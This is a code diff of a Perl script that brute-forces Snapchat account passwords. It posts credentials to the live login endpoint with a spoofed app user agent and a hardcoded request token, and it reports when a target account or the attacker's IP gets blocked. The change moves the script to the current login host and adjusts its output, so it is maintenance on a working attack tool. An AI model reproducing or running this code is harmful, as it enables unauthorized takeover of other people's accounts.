@@ -53,7 +53,7 @@ chomp $username;
 		$snapchat = LWP::UserAgent->new();
 		$snapchat->default_header('Accept-Language' => "en;q=0.9");
 		$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
-		$response = $snapchat->post('https://feelinsonice-hrd.appspot.com/loq/login',
+		$response = $snapchat->post('https://app.snapchat.com/loq/login',
 			{ 
 			password => $password,
 			req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
@@ -85,11 +85,11 @@ chomp $username;
 					else
 					{
 						if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
-							print "Block bruting only this user -> ($username)";
+							print "Block bruting only this user -> ($username)\n";
 						}
 						else
 						{
-							print "Blocked Your IP for Requests";
+							print "Blocked Your IP for Requests\n";
 						}
 					}
 				}
